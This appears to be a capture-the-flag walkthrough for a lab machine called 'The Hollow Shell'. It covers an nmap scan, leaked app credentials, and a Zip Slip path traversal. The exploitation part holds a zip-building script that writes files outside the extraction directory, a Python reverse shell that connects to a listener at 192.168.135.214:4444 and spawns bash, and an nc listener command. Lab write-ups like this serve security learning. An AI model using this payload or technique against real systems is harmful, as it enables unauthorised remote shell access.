# The Hollow Shell

<img width="1912" height="350" alt="image" src="https://github.com/user-attachments/assets/ba6141b4-3be6-4372-b61c-d613f6d6b561" />

---

## nmap scan 

```ruby
└─$ nmap -sCV -Pn 10.113.187.252
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-09 06:12 UTC
Nmap scan report for 10.113.187.252
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c2:0c:f2:1c:fc:84:5b:0b:8c:87:36:9f:9b:99:d3:83 (ECDSA)
|_  256 ee:17:1c:bb:5e:cd:60:03:82:c3:38:c3:95:1c:77:63 (ED25519)
5000/tcp open  http    Gunicorn
| http-title: Byte Lotus \xE2\x80\x94 Room Service
|_Requested resource was /login
|_http-server-header: gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds

```

## found credintioanls

<img width="1243" height="329" alt="image" src="https://github.com/user-attachments/assets/e395c85a-9c5f-4a55-9d06-c6fa3caa1e44" />

```
user: concierge
pass: StayNoticed2024!
```

---

<img width="1919" height="705" alt="image" src="https://github.com/user-attachments/assets/33db6dfd-a30e-4188-82c5-2b10c8fe9d1f" />

What is Zip Slip?
-----------------

Zip Slip is a vulnerability where you can write files outside the intended directory by using `../` (parent directory traversal) in filenames inside a zip file.

Normal behavior:

```text

shell.zip → extracts to → /shells/abc123/
```

Zip Slip behavior:

```text

shell.zip contains: ../../hooks/callback.py
→ extracts to → /hooks/callback.py (outside the shell directory!)
```

### Confirm Zip Slip Works

Write a CSS file to `/static/` (publicly accessible):

```python

import zipfile
zf = zipfile.ZipFile('zipslip-proof.zip', 'w')
zf.writestr('shell.json', '{"name": "zipslip-proof", "assets": []}')
zf.writestr('../../static/zipslip-proof.css', 'ZIP_SLIP_CONFIRMED')
zf.close()
```

After uploading, we can visit:

```text

http://10.113.187.252:5000/static/zipslip-proof.css
```

<img width="991" height="231" alt="image" src="https://github.com/user-attachments/assets/19776ddb-3765-469c-bf70-df0b2a947b66" />

### Find Where to Write

The dashboard mentions "automation hooks" → background process runs hooks.

Target: `/hooks/` folder at the app root.

Test if hooks/ exists:

```python

# Write a test file to hooks/
zf.writestr('../../hooks/test.txt', 'exists')
```

Clean response (no 500 error) → hooks/ exists!

### Exploit: Reverse Shell

Create `callback.py` (reverse shell payload):

```python

import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.135.214", 4444))  
for fd in (0, 1, 2):
 os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
```

Create the malicious zip:

```python

import zipfile
zf = zipfile.ZipFile('reverse-shell.zip', 'w')
zf.writestr('shell.json', open('shell.json').read())
zf.writestr('../../hooks/callback.py', open('callback.py').read())  # ← Writes to hooks/
zf.close()
```

Upload and wait:

1.  Start listener: `nc -lvnp 4444`

2.  Upload `reverse-shell.zip`

3.  Wait for the background process to run `callback.py`

4.  BOOM: Reverse shell as the app user!

<img width="1000" height="267" alt="image" src="https://github.com/user-attachments/assets/ef12ff7a-ba72-4fd0-b039-aa9696f3125c" />

